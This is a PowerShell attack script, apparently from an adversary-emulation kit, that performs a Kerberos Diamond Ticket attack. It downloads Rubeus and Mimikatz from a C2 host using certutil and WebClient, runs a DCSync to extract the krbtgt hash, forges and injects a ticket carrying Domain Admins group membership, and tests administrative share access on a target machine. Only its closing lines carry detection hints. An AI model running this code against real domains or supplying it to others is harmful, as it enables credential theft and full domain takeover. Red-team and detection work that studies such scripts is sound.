$ErrorActionPreference = "SilentlyContinue"
$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }
$TargetIP = if ($env:TARGET_IP) { $env:TARGET_IP } else { "192.168.1.10" }

# Input parameters
$KrbtgtHash = if ($env:KRBTGT_HASH) { $env:KRBTGT_HASH } else { "" }

Write-Host "[*] Starting Identity Attack - Diamond Ticket (Rubeus diamond)..." -ForegroundColor Cyan

# T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket (Diamond Variant)
# Unlike Golden Ticket, Diamond Ticket modifies a REAL TGT's PAC
# Requests legitimate TGT -> decrypts with krbtgt hash -> modifies PAC -> re-encrypts
# Much harder to detect because the ticket was legitimately issued by KDC

Write-Host "[!] Requires: krbtgt AES256 or NTLM hash (from DCSync)" -ForegroundColor Yellow
Write-Host "[!] This is STEALTHIER than Golden Ticket - modifies a real TGT" -ForegroundColor Yellow

$stagingDir = "C:\temp\staging"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null

# Step 1: Gather domain info
Write-Host "`n[*] Gathering domain information..." -ForegroundColor Yellow

try {
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $domainName = $domain.Name
    Write-Host "[+] Domain: $domainName" -ForegroundColor Green
} catch {
    $domainName = $env:USERDNSDOMAIN
    Write-Host "[*] Domain: $domainName" -ForegroundColor Yellow
}

# Get Domain SID
try {
    $whoamiSID = (whoami /user /fo csv | ConvertFrom-Csv).SID
    $domainSID = $whoamiSID -replace "-\d+$", ""
    Write-Host "[+] Domain SID: $domainSID" -ForegroundColor Green
} catch {
    Write-Host "[-] Could not determine Domain SID" -ForegroundColor Red
}

# Step 2: Download Rubeus (primary tool for Diamond Ticket)
Write-Host "`n[*] [T1105] Downloading Rubeus..." -ForegroundColor Yellow
$rubeusPath = "$stagingDir\Rubeus.exe"
Write-Host "    CMD: certutil -urlcache -split -f http://$C2Host/tools/Rubeus.exe $rubeusPath"
certutil -urlcache -split -f "http://$C2Host/tools/Rubeus.exe" $rubeusPath

if (-not (Test-Path $rubeusPath)) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://$C2Host/tools/Rubeus.exe", $rubeusPath)
    } catch { Write-Host "[-] Download failed." -ForegroundColor Red }
}

# Also need Mimikatz for DCSync if hash not provided
$mimikatzPath = "$stagingDir\mimikatz.exe"
if (-not (Test-Path $mimikatzPath)) {
    certutil -urlcache -split -f "http://$C2Host/tools/mimikatz.exe" $mimikatzPath 2>&1 | Out-Null
}

if (Test-Path $rubeusPath) {
    Write-Host "[+] Rubeus staged successfully" -ForegroundColor Green

    if (-not $KrbtgtHash -and (Test-Path $mimikatzPath)) {
        # Extract krbtgt hash via DCSync
        Write-Host "`n[*] No krbtgt hash provided. Attempting DCSync..." -ForegroundColor Yellow
        $dcsyncOut = & $mimikatzPath "privilege::debug" "lsadump::dcsync /user:krbtgt" "exit" 2>&1
        $dcsyncOut | ForEach-Object { Write-Host $_ }

        # Try AES256 first (preferred for Diamond Ticket)
        $aesMatch = $dcsyncOut | Select-String "aes256_hmac\s+([a-fA-F0-9]{64})"
        if ($aesMatch) {
            $KrbtgtHash = $aesMatch.Matches[0].Groups[1].Value
            $hashType = "aes256"
            Write-Host "[+] Extracted krbtgt AES256 key: $KrbtgtHash" -ForegroundColor Green
        } else {
            # Fall back to NTLM
            $ntlmMatch = $dcsyncOut | Select-String "Hash NTLM:\s+([a-fA-F0-9]{32})"
            if ($ntlmMatch) {
                $KrbtgtHash = $ntlmMatch.Matches[0].Groups[1].Value
                $hashType = "rc4"
                Write-Host "[+] Extracted krbtgt NTLM hash: $KrbtgtHash" -ForegroundColor Green
            }
        }
    }

    if ($KrbtgtHash) {
        # Determine hash type by length
        if (-not $hashType) {
            if ($KrbtgtHash.Length -eq 64) { $hashType = "aes256" }
            else { $hashType = "rc4" }
        }

        # Step 3: Forge Diamond Ticket
        Write-Host "`n[*] [T1558.001] Forging Diamond Ticket..." -ForegroundColor Yellow
        Write-Host "    This requests a real TGT, decrypts it, modifies the PAC, and re-encrypts"
        Write-Host "    Hash Type: $hashType"

        $ticketUser = "DiamondAdmin"

        if ($hashType -eq "aes256") {
            $diamondCmd = "diamond /krbkey:$KrbtgtHash /ticketuser:$ticketUser /ticketuserid:500 /groups:512 /ptt"
        } else {
            $diamondCmd = "diamond /tgtdeleg /rc4:$KrbtgtHash /ticketuser:$ticketUser /ticketuserid:500 /groups:512 /ptt"
        }

        Write-Host "    CMD: Rubeus.exe $diamondCmd"
        & $rubeusPath $diamondCmd 2>&1

        # Step 4: Verify ticket injection
        Write-Host "`n[*] Verifying Diamond Ticket in cache..." -ForegroundColor Yellow
        Write-Host "    CMD: klist"
        klist 2>&1

        # Step 5: Test access
        Write-Host "`n[*] [T1021.002] Testing access with Diamond Ticket..." -ForegroundColor Yellow
        Write-Host "    CMD: dir \\$TargetIP\C$"
        dir "\\$TargetIP\C$" 2>&1

        # Step 6: Also demonstrate tgtdeleg trick (no hash needed, but less control)
        Write-Host "`n[*] [BONUS] Demonstrating tgtdeleg TGT extraction..." -ForegroundColor Yellow
        Write-Host "    CMD: Rubeus.exe tgtdeleg"
        Write-Host "    (Extracts usable TGT from current session using GSS-API trick)"
        & $rubeusPath tgtdeleg 2>&1

    } else {
        Write-Host "[-] No krbtgt hash available. DCSync failed or hash not provided." -ForegroundColor Red
        Write-Host "[!] Run DCSync first or provide hash via KRBTGT_HASH parameter" -ForegroundColor Yellow
    }
} else {
    Write-Host "[-] Cannot execute - Rubeus not available" -ForegroundColor Red
    Write-Host "[!] Ensure http://$C2Host/tools/Rubeus.exe is accessible" -ForegroundColor Yellow
}

Write-Host "`n[+] Diamond Ticket Attack Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: TGT with modified PAC, abnormal group memberships, Rubeus execution" -ForegroundColor Yellow
Write-Host "[!] Key Difference from Golden: Diamond uses a REAL ticket - harder to detect via metadata analysis" -ForegroundColor Yellow
Write-Host "[!] Detection: Compare PAC group membership against actual AD group membership" -ForegroundColor Yellow
